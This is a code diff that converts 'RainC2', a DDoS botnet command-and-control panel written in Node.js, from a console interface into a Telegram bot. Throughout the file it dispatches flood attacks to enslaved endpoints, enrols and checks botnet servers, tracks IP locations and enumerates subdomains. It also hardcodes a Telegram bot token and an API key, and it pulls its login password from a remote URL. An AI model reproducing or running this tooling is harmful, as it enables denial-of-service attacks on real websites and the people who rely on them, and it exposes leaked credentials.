@@ -1,290 +1,486 @@
 #!/usr/bin/env node
-const readline = require('readline');
+
+const { Telegraf } = require('telegraf');
+const { exec, spawn } = require('child_process');
 const url = require('url');
 const fs = require('fs');
 const axios = require('axios');
 const path = require('path');
-const crypto = require('crypto');
 
-// --- Configuration ---
-const LIB_DIR = path.join(__dirname, 'lib');
-const CONFIG_FILE_PATH = path.join(LIB_DIR, 'config.json');
-const BOTNET_FILE_PATH = path.join(LIB_DIR, 'botnet.json');
-const METHODS_FILE_PATH = path.join(LIB_DIR, 'methods.json');
+const version = '7.0.0';
+const bot = new Telegraf('8219882191:AAHsRc-bQ2nTzn0f5toaI2d86CDd6nej1aI');
 
-const rl = readline.createInterface({
-  input: process.stdin,
-  output: process.stdout,
-  prompt: '\x1b[1m\x1b[31mRainC2\x1b[0m\x1b[1m > \x1b[0m'
+let processList = [];
+let authorizedUsers = new Set(); // Store authorized user IDs
+
+// [========================================] //
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+// [========================================] //
+async function banner(ctx) {
+    const welcomeMsg = `
+[SYSTEM] Welcome To RainC2
+[SYSTEM] Owner Tools: t.me/@Steveezarex
+Please Type /help for Show All Menu
+_________________________________________________
+`;
+    return welcomeMsg;
+}
+
+// [========================================] //
+async function scrapeProxy() {
+    try {
+        const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
+        const data = await response.text();
+        fs.writeFileSync('proxy.txt', data, 'utf-8');
+        return true;
+    } catch (error) {
+        console.error(`Error fetching proxy data: ${error.message}`);
+        return false;
+    }
+}
+
+async function scrapeUserAgent() {
+    try {
+        const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
+        const data = await response.text();
+        fs.writeFileSync('ua.txt', data, 'utf-8');
+        return true;
+    } catch (error) {
+        console.error(`Error fetching user-agent data: ${error.message}`);
+        return false;
+    }
+}
+
+// [========================================] //
+function clearUserAgent() {
+    if (fs.existsSync('ua.txt')) {
+        fs.unlinkSync('ua.txt');
+    }
+}
+
+// [========================================] //
+async function authenticateUser(ctx) {
+    try {
+        const secretBangetJir = await fetch('https://raw.githubusercontent.com/D4youXTool/cache/main/sigma.txt');
+        const password = await secretBangetJir.text();
+        
+        return ctx.message.text.trim() === password.trim();
+    } catch (error) {
+        console.error('Authentication error:', error);
+        return false;
+    }
+}
+
+// [========================================] //
+async function AttackBotnetEndpoints(target, duration, methods, ctx) {
+    if (!target || !duration || !methods) {
+        return ctx.reply('Example: /attack https://google.com 120 flood');
+    }
+
+    try {
+        const parsedUrl = new url.URL(target);
+        const hostname = parsedUrl.hostname;
+        const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
+        const result = scrape.data;
+
+        const startTime = Date.now();
+        const endTime = startTime + duration * 1000;
+        processList.push({ target, methods, startTime, duration, endTime, ip: result.query });
+        
+        const now = new Date();
+        const options = { month: 'short', day: 'numeric', year: 'numeric', timeZone: 'Asia/Jakarta' };
+        const formattedDate = now.toLocaleString('en-US', options);
+
+        const attackDetails = `
+🚀 Attack Details
+   Status: ✅ Attack Sent Successfully All Servers
+   Host: ${target}
+   Port: 443
+   Time: ${duration}s
+   Methods: ${methods}
+   Sent On: ${formattedDate}
+
+🎯 Target Details
+   ASN: ${result.as}
+   ISP: ${result.isp}
+   ORG: ${result.org}
+   Country: ${result.country}
+
+⚠️ Note: Not Spam Attack
+`;
+        
+        await ctx.reply(attackDetails);
+
+        let botnetData;
+        let successCount = 0;
+        const timeout = 20000;
+        const validEndpoints = [];
+
+        // Load botnet data
+        try {
+            botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
+        } catch (error) {
+            botnetData = { endpoints: [] };
+        }
+
+        // Send requests to each endpoint
+        const requests = botnetData.endpoints.map(async (endpoint) => {
+            const apiUrl = `${endpoint}?target=${target}&time=${duration}&methods=${methods}`;
+
+            try {
+                const response = await axios.get(apiUrl, { timeout });
+                if (response.status === 200) {
+                    successCount++;
+                    validEndpoints.push(endpoint);
+                }
+            } catch (error) {
+                console.error(`Error sending request to ${endpoint}: ${error.message}`);
+            }
+        });
+
+        await Promise.all(requests);
+
+        // Save valid endpoints back to the file
+        botnetData.endpoints = validEndpoints;
+        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
+
+        await ctx.reply(`✅ Attack completed! ${successCount} servers responded successfully.`);
+
+    } catch (error) {
+        await ctx.reply(`❌ Error retrieving target information: ${error.message}`);
+    }
+}
+
+function methods(ctx) {
+    try {
+        const methodsData = JSON.parse(fs.readFileSync('lib/methods.json', 'utf-8'));
+        
+        let response = `📋 Available Methods:\n\n`;
+        response += `NAME       │ DESCRIPTION                    │ DURATION\n`;
+        response += `───────────┼────────────────────────────────┼──────────\n`;
+
+        methodsData.forEach(method => {
+            response += `${method.name.padEnd(10)} │ ${method.description.padEnd(30)} │ ${method.duration.padEnd(3)}\n`;
+        });
+
+        ctx.reply(response);
+    } catch (error) {
+        ctx.reply('❌ Error loading methods data.');
+    }
+}
+
+async function processBotnetEndpoint(endpointUrl, ctx) {
+    if (!endpointUrl) {
+        return ctx.reply('Example: /addvps http://1.1.1.1:2000/RainC2');
+    }
+
+    try {
+        const parsedUrl = new url.URL(endpointUrl);
+        const hostt = parsedUrl.host;
+        const endpoint = 'http://' + hostt + '/RainC2';
+
+        // Load botnet data
+        let botnetData;
+        try {
+            const data = await fs.promises.readFile('./lib/botnet.json', 'utf8');
+            botnetData = JSON.parse(data);
+        } catch (error) {
+            botnetData = { endpoints: [] };
+        }
+
+        // Check if endpoint already exists
+        if (botnetData.endpoints.includes(endpoint)) {
+            return ctx.reply(`⚠️ Endpoint ${endpoint} is already in the botnet list.`);
+        }
+
+        // Add endpoint and save data
+        botnetData.endpoints.push(endpoint);
+        await fs.promises.writeFile('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
+
+        ctx.reply(`✅ Endpoint ${endpoint} added to botnet.`);
+    } catch (error) {
+        ctx.reply(`❌ Error processing botnet endpoint: ${error.message}`);
+    }
+}
+
+async function trackIP(ipAddress, ctx) {
+    if (!ipAddress) {
+        return ctx.reply('Example: /trackip 1.1.1.1');
+    }
+
+    if (ipAddress === '0.0.0.0') {
+        return ctx.reply('🚫 Invalid IP address provided.');
+    }
+
+    try {
+        const apiKey = '8fd0a436e74f44a7a3f94edcdd71c696';
+        const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ipAddress}`);
+        const res = await fetch(`https://ipwho.is/${ipAddress}`);
+        const additionalInfo = await res.json();
+        const ipInfo = await response.json();
+
+        const trackResult = `
+🌍 IP Tracking Results for ${ipAddress}
+
+📍 Location Info:
+   - Country: ${ipInfo.country_name}
+   - Capital: ${ipInfo.country_capital}
+   - City: ${ipInfo.city}
+   - ISP: ${ipInfo.isp}
+   - Organization: ${ipInfo.organization}
+   - Coordinates: ${ipInfo.latitude}, ${ipInfo.longitude}
+      
+🗺️ Google Maps: https://www.google.com/maps/place/${additionalInfo.latitude}+${additionalInfo.longitude}
+`;
+        
+        await ctx.reply(trackResult);
+    } catch (error) {
+        await ctx.reply(`❌ Error tracking ${ipAddress}: ${error.message}`);
+    }
+}
+
+async function monitorOngoingAttacks(ctx) {
+    // Filter processes that are still running
+    processList = processList.filter((process) => {
+        const remaining = Math.max(0, Math.floor((process.endTime - Date.now()) / 1000));
+        return remaining > 0;
+    });
+
+    if (processList.length === 0) {
+        return ctx.reply("📊 No attacks are currently running.");
+    }
+
+    let attackDetails = `🔄 Running Attacks:\n\n`;
+    attackDetails += `#  │ HOST                    │ SINCE │ DURATION │ METHOD\n`;
+    attackDetails += `───┼─────────────────────────┼───────┼──────────┼────────\n`;
+
+    processList.forEach((process, index) => {
+        const host = process.ip || process.target;
+        const since = Math.floor((Date.now() - process.startTime) / 1000);
+        const duration = `${process.duration}s`;
+
+        attackDetails += `${String(index + 1).padEnd(2)} │ ${host.padEnd(23)} │ ${String(since).padEnd(5)} │ ${duration.padEnd(8)} │ ${process.methods}\n`;
+    });
+
+    ctx.reply(attackDetails);
+}
+
+async function checkBotnetEndpoints(ctx) {
+    let botnetData;
+    let successCount = 0;
+    const timeout = 20000;
+    const validEndpoints = [];
+
+    // Load botnet data
+    try {
+        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
+    } catch (error) {
+        botnetData = { endpoints: [] };
+    }
+
+    // Send test requests to each endpoint
+    const requests = botnetData.endpoints.map(async (endpoint) => {
+        const apiUrl = `${endpoint}?target=https://google.com&time=1&methods=ninja`;
+
+        try {
+            const response = await axios.get(apiUrl, { timeout });
+            if (response.status === 200) {
+                successCount++;
+                validEndpoints.push(endpoint);
+            }
+        } catch (error) {
+            console.error(`Error sending request to ${endpoint}: ${error.message}`);
+        }
+    });
+
+    await Promise.all(requests);
+    
+    // Save valid endpoints back to the file
+    botnetData.endpoints = validEndpoints;
+    fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
+
+    ctx.reply(`✅ Botnet check completed! ${successCount} servers are online.`);
+}
+
+async function subdomen(domain, ctx) {
+    if (!domain) {
+        return ctx.reply('Example: /subdo starsx.tech');
+    }
+
+    try {
+        let response = await axios.get(`https://api.agatz.xyz/api/subdomain?url=${domain}`);
+        let subdomains = response.data.data;
+
+        if (subdomains && subdomains.length > 0) {
+            let result = `🔍 Subdomains found for ${domain}:\n\n`;
+            result += subdomains.map((data, index) => `${index + 1}. ${data}`).join('\n');
+            ctx.reply(result);
+        } else {
+            ctx.reply(`❌ No subdomains found for ${domain}`);
+        }
+    } catch (error) {
+        ctx.reply(`❌ Error finding subdomains: ${error.message}`);
+    }
+}
+
+// [========================================] //
+// Telegram Bot Commands
+// [========================================] //
+
+bot.start(async (ctx) => {
+    const welcomeMsg = await banner(ctx);
+    ctx.reply(welcomeMsg + '\n\n🤖 RainC2 Telegram Bot is now active!\nUse /help to see available commands.');
 });
 
-// --- Utility Functions ---
+bot.help((ctx) => {
+    const helpText = `
+🤖 *RainC2 Telegram Bot Commands*
 
-function sleep(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
-}
+📋 *Basic Commands:*
+/start - Start the bot
+/help - Show this help message
+/auth <password> - Authenticate with password
 
-function ensureLibDirExists() {
-  if (!fs.existsSync(LIB_DIR)) {
-    fs.mkdirSync(LIB_DIR, { recursive: true });
-    console.log(`\x1b[32m[SYSTEM]\x1b[0m Created library directory at: ${LIB_DIR}`);
-  }
-}
+🎯 *Attack Commands:*
+/attack <target> <duration> <method> - Launch DDoS attack
+/monitor - Show running attacks
+/methods - Show available methods
 
-function getConfig() {
-    if (!fs.existsSync(CONFIG_FILE_PATH)) {
-        return null;
+🌐 *Botnet Management:*
+/addvps <endpoint> - Add new server
+/listvps - Check botnet servers status
+
+🔍 *Tools:*
+/trackip <ip> - Track IP address info
+/subdo <domain> - Find subdomains
+
+ℹ️ *Info:*
+/credits - Show creator credits
+/news - Show latest news
+`;
+    ctx.reply(helpText, { parse_mode: 'Markdown' });
+});
+
+bot.command('auth', async (ctx) => {
+    const password = ctx.message.text.split(' ')[1];
+    if (!password) {
+        return ctx.reply('❌ Please provide password. Usage: /auth <password>');
     }
-    try {
-        const configData = fs.readFileSync(CONFIG_FILE_PATH, 'utf-8');
-        return JSON.parse(configData);
-    } catch (error) {
-        console.error('\x1b[31m[FATAL]\x1b[0m Your config.json is corrupted. Fix it or delete it.');
-        process.exit(1);
-    }
-}
 
-function handleNetworkError(error, context) {
-    console.error(`\x1b[31m[ERROR]\x1b[0m ${context}`);
-    if (error.code) {
-        console.error(`\x1b[31m->\x1b[0m Code: ${error.code}. Check your network connection or the target URL.`);
-    } else if (error.response) {
-        console.error(`\x1b[31m->\x1b[0m Server responded with a shitty status: ${error.response.status}`);
+    const isValid = await authenticateUser(ctx);
+    if (isValid) {
+        authorizedUsers.add(ctx.from.id);
+        await scrapeProxy();
+        await scrapeUserAgent();
+        ctx.reply('✅ Authentication successful! Bot is now ready to use.');
     } else {
-        console.error(`\x1b[31m->\x1b[0m Unknown network error: ${error.message}`);
+        ctx.reply('❌ Wrong password! Access denied.');
     }
-}
+});
 
-// --- Core Functions ---
-
-function banner() {
-  console.clear();
-  console.log(`\x1b[31mRainC2\x1b[0m │ The Will of the Swarm, Manifested.
-Type \x1b[1m\x1b[32mhelp\x1b[0m to see your commands.
-\x1b[34m───────────────────────────────────────────────────────────────────────────────\x1b[0m
-`);
-}
-
-function setupKey() {
-    rl.question('\x1b[1m\x1b[36mNo access key found. Set a new one now: \x1b[0m', (newKey) => {
-        if (!newKey.trim()) {
-            console.error('\x1b[31m[ERROR]\x1b[0m The key cannot be empty, you moron.');
-            return setupKey();
-        }
-        const hashedKey = crypto.createHash('sha256').update(newKey.trim()).digest('hex');
-        const newConfig = { accessKeyHash: hashedKey };
-        fs.writeFileSync(CONFIG_FILE_PATH, JSON.stringify(newConfig, null, 2));
-        console.log('\x1b[32m[SUCCESS]\x1b[0m Access key set. Restart the application to log in.');
-        process.exit(0);
-    });
-}
-
-function login() {
-    const config = getConfig();
-    if (!config || !config.accessKeyHash) {
-        return setupKey();
-    }
-    
-    rl.question('\x1b[1m\x1b[36mEnter Access Key: \x1b[0m', async (inputKey) => {
-        const hashedInput = crypto.createHash('sha256').update(inputKey.trim()).digest('hex');
-        if (hashedInput === config.accessKeyHash) {
-            console.clear();
-            console.log(`\x1b[32mAuthentication Accepted. Welcome, Overlord.\x1b[0m`);
-            await sleep(1000);
-            await banner();
-            mainLoop();
-        } else {
-            console.log(`\x1b[31mWrong Key. You are not worthy.\x1b[0m`);
-            login();
-        }
-    });
-}
-
-async function bootup() {
-    console.clear();
-    console.log(`\x1b[1m[ \x1b[32mRainC2\x1b[0m \x1b[1m]\x1b[0m Initializing...`);
-    ensureLibDirExists();
-
-    const RainC2Methods = [
-        {"name": "HTTP-SICARIO", "description": "Composite high-request HTTP flood."},
-        {"name": "RAW-HTTP", "description": "Raw HTTP/2 and panel-focused flood."},
-        {"name": "R9", "description": "High dstat, hold, and bypass composite method."},
-        {"name": "PRIV-TOR", "description": "High-volume flood utilizing various vectors."},
-        {"name": "HOLD-PANEL", "description": "Direct HTTP panel attack."},
-        {"name": "R1", "description": "The ultimate swarm. All vectors, maximum chaos."}
-    ];
-    fs.writeFileSync(METHODS_FILE_PATH, JSON.stringify(RainC2Methods, null, 2));
-    
-    console.log(`\x1b[32m[SYSTEM]\x1b[0m Ready.`);
-    login();
-}
-
-// --- Command Functions ---
-
-function showMethods() {
-    const methodsData = JSON.parse(fs.readFileSync(METHODS_FILE_PATH, 'utf-8'));
-    console.log(`\n\x1b[0m NAME           │ DESCRIPTION`);
-    console.log(`\x1b[0m────────────────┼──────────────────────────────────────────────────`);
-    methodsData.forEach(method => {
-        console.log(`\x1b[31m${method.name.padEnd(14)}\x1b[0m │ ${method.description}`);
-    });
-}
-
-function addsrv(args) {
-    if (args.length < 1) {
-        console.log(`\x1b[33mUsage:\x1b[0m addsrv <endpoint_url>`);
-        return;
-    }
-    const endpoint = args[0];
-    try { new url.URL(endpoint); } catch { console.error(`\x1b[31m[ERROR]\x1b[0m Invalid URL: ${endpoint}`); return; }
-
-    let botnetData = { endpoints: [] };
-    if (fs.existsSync(BOTNET_FILE_PATH)) {
-        botnetData = JSON.parse(fs.readFileSync(BOTNET_FILE_PATH, 'utf8'));
+bot.command('attack', (ctx) => {
+    const userId = ctx.from.id;
+    if (!authorizedUsers.has(userId)) {
+        return ctx.reply('❌ Please authenticate first using /auth <password>');
     }
 
-    if (botnetData.endpoints.includes(endpoint)) {
-        console.log(`\x1b[33m[INFO]\x1b[0m Endpoint ${endpoint} is already enslaved.`);
-    } else {
-        botnetData.endpoints.push(endpoint);
-        fs.writeFileSync(BOTNET_FILE_PATH, JSON.stringify(botnetData, null, 2));
-        console.log(`\x1b[32m[SUCCESS]\x1b[0m Endpoint ${endpoint} added to the swarm.`);
-    }
-}
-
-function delsrv(args) {
-    if (args.length < 1) {
-        console.log(`\x1b[33mUsage:\x1b[0m delsrv <endpoint_url_or_index>`);
-        return;
-    }
-    if (!fs.existsSync(BOTNET_FILE_PATH)) {
-         console.error('\x1b[31m[ERROR]\x1b[0m Botnet file not found. Nothing to delete.');
-         return;
-    }
-    
-    let botnetData = JSON.parse(fs.readFileSync(BOTNET_FILE_PATH, 'utf8'));
-    const initialCount = botnetData.endpoints.length;
-    
-    const arg = args[0];
-    const index = parseInt(arg, 10);
-
-    if (!isNaN(index) && index >= 0 && index < initialCount) {
-        const removed = botnetData.endpoints.splice(index, 1);
-        console.log(`\x1b[32m[SUCCESS]\x1b[0m Removed node #${index}: ${removed}`);
-    } else {
-        botnetData.endpoints = botnetData.endpoints.filter(e => e !== arg);
-    }
-    
-    if (botnetData.endpoints.length < initialCount) {
-        fs.writeFileSync(BOTNET_FILE_PATH, JSON.stringify(botnetData, null, 2));
-        if(isNaN(index)) console.log(`\x1b[32m[SUCCESS]\x1b[0m Endpoint ${arg} has been freed.`);
-    } else {
-        console.log(`\x1b[33m[INFO]\x1b[0m Endpoint not found.`);
-    }
-}
-
-
-async function listsrv() {
-    if (!fs.existsSync(BOTNET_FILE_PATH)) {
-        console.error('\x1b[31m[ERROR]\x1b[0m Botnet file not found. Enslave some servers with \`addsrv\` first.');
-        return;
-    }
-    const botnetData = JSON.parse(fs.readFileSync(BOTNET_FILE_PATH, 'utf8'));
-    if (!botnetData.endpoints || botnetData.endpoints.length === 0) {
-        console.log('\x1b[33m[INFO]\x1b[0m The swarm is empty. It craves nodes.');
-        return;
-    }
-
-    console.log(`\x1b[1m[RainC2]\x1b[0m Pinging ${botnetData.endpoints.length} node(s)...`);
-    const timeout = 8000;
-    const promises = botnetData.endpoints.map(async (endpoint, index) => {
-        try {
-            await axios.get(endpoint, { timeout, params: { target: 'https://google.com', time: 1, methods: 'test' } });
-            console.log(`\x1b[0m [#${index}] \x1b[32m[ONLINE]\x1b[0m  - ${endpoint}`);
-        } catch {
-            console.log(`\x1b[0m [#${index}] \x1b[31m[OFFLINE]\x1b[0m - ${endpoint}`);
-        }
-    });
-    await Promise.all(promises);
-}
-
-async function launchAttack(args) {
+    const args = ctx.message.text.split(' ').slice(1);
     if (args.length < 3) {
-        console.log(`\x1b[33mUsage:\x1b[0m attack <target> <time> <method>`);
-        return;
+        return ctx.reply('❌ Example: /attack https://google.com 120 flood');
     }
-    const [target, time, method] = args;
-    if (isNaN(parseInt(time))) {
-        console.error(`\x1b[31m[ERROR]\x1b[0m Time must be a fucking number.`);
-        return;
-    }
-    
-    if (!fs.existsSync(BOTNET_FILE_PATH)) {
-        console.error('\x1b[31m[ERROR]\x1b[0m Botnet file not found. Enslave a server first.');
-        return;
-    }
-    const botnetData = JSON.parse(fs.readFileSync(BOTNET_FILE_PATH, 'utf8'));
-    if (!botnetData.endpoints || botnetData.endpoints.length === 0) {
-        console.error('\x1b[31m[ERROR]\x1b[0m No nodes in the swarm. Use `addsrv`.');
-        return;
-    }
-    
-    console.log(`\x1b[1;37mUnleashing the swarm on \x1b[36m${target}\x1b[0m for \x1b[36m${time}s\x1b[0m using method \x1b[36m${method.toUpperCase()}\x1b[0m...`);
 
-    let successCount = 0;
-    const requests = botnetData.endpoints.map(async (endpoint) => {
-        const apiUrl = `${endpoint}?target=${encodeURIComponent(target)}&time=${time}&methods=${method.toUpperCase()}`;
-        try {
-            await axios.get(apiUrl, { timeout: 15000 });
-            successCount++;
-        } catch { /* A single drone failure is irrelevant */ }
-    });
-    await Promise.all(requests);
-    console.log(`\n\x1b[32m[SUCCESS]\x1b[0m Attack command sent to ${successCount}/${botnetData.endpoints.length} online nodes. Carnage incoming.`);
+    const [target, duration, methods] = args;
+    AttackBotnetEndpoints(target, duration, methods, ctx);
+});
+
+bot.command('methods', (ctx) => {
+    methods(ctx);
+});
+
+bot.command('addvps', async (ctx) => {
+    const userId = ctx.from.id;
+    if (!authorizedUsers.has(userId)) {
+        return ctx.reply('❌ Please authenticate first using /auth <password>');
+    }
+
+    const endpointUrl = ctx.message.text.split(' ')[1];
+    processBotnetEndpoint(endpointUrl, ctx);
+});
+
+bot.command('listvps', (ctx) => {
+    const userId = ctx.from.id;
+    if (!authorizedUsers.has(userId)) {
+        return ctx.reply('❌ Please authenticate first using /auth <password>');
+    }
+
+    checkBotnetEndpoints(ctx);
+});
+
+bot.command('monitor', (ctx) => {
+    const userId = ctx.from.id;
+    if (!authorizedUsers.has(userId)) {
+        return ctx.reply('❌ Please authenticate first using /auth <password>');
+    }
+
+    monitorOngoingAttacks(ctx);
+});
+
+bot.command('trackip', (ctx) => {
+    const ipAddress = ctx.message.text.split(' ')[1];
+    trackIP(ipAddress, ctx);
+});
+
+bot.command('subdo', (ctx) => {
+    const domain = ctx.message.text.split(' ')[1];
+    subdomen(domain, ctx);
+});
+
+bot.command('credits', (ctx) => {
+    const creatorCredits = `
+ᴄʀᴇᴅɪᴛs
+ᴏᴡɴᴇʀ: Stevee
+ᴠᴇʀsɪᴏɴ: v2
+`;
+    ctx.reply(creatorCredits);
+});
+
+bot.command('news', async (ctx) => {
+    try {
+        const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`);
+        const latestNews = await getNews.text();
+        ctx.reply(`📰 Latest News:\n\n${latestNews}`);
+    } catch (error) {
+        ctx.reply('❌ Error fetching news.');
+    }
+});
+
+// Error handling
+bot.catch((err, ctx) => {
+    console.error(`❌ Error for ${ctx.updateType}:`, err);
+    ctx.reply('❌ An error occurred while processing your request.');
+});
+
+// Cleanup function
+function clearall() {
+    clearUserAgent();
 }
 
-// --- Main Command Loop ---
-async function mainLoop() {
-    rl.prompt();
-    rl.on('line', async (line) => {
-        const [command, ...args] = line.trim().split(/\s+/);
-        const action = command ? command.toLowerCase() : '';
+process.on('exit', clearall);
+process.on('SIGINT', () => {
+    clearall();
+    process.exit();
+});
+process.on('SIGTERM', () => {
+    clearall();
+    process.exit();
+});
 
-        switch (action) {
-            case 'help':
-                console.log(`
-\x1b[0mNAME         │ DESCRIPTION
-─────────────┼──────────────────────────────────────────────────
- methods     │ Show list of available attack methods
- addsrv      │ <url> - Enslave a new API node to the swarm
- delsrv      │ <url|index> - Remove a node from the swarm
- listsrv     │ Check status of all enslaved nodes
- attack      │ <target> <time> <method> - Unleash the swarm
- dev         │ Credit where credit is fucking due
- clear       │ (cls, c) - Clear your pathetic screen
- exit        │ (quit) - Terminate this session
-`);
-                break;
-            case 'methods': showMethods(); break;
-            case 'addsrv': addsrv(args); break;
-            case 'delsrv': delsrv(args); break;
-            case 'listsrv': await listsrv(); break;
-            case 'attack': await launchAttack(args); break;
-            case 'dev': console.log('\n\x1b[36mForged in the digital fires by Stevee & Gwyn.\x1b[0m\n'); break;
-            case 'clear': case 'cls': case 'c': banner(); break;
-            case 'exit': case 'quit': console.log('\x1b[0mGo cause some fucking chaos.\x1b[0m'); process.exit(0); break;
-            case '': break; // Do nothing if user just presses enter
-            default:
-                console.log(`\x1b[31mUnknown command: "${action}". Type "help", you fucking moron.\x1b[0m`);
-                break;
-        }
-        rl.prompt();
-    }).on('close', () => {
-        console.log('\nSession terminated.');
-        process.exit(0);
-    });
-}
+// Start the bot
+console.log('🤖 RainC2 Telegram Bot is starting...');
+bot.launch();
 
-// --- Cleanup and Startup ---
-process.on('SIGINT', () => process.exit());
-bootup();
+console.log('✅ Bot is running!');
+console.log('📱 Use /start to begin interaction');
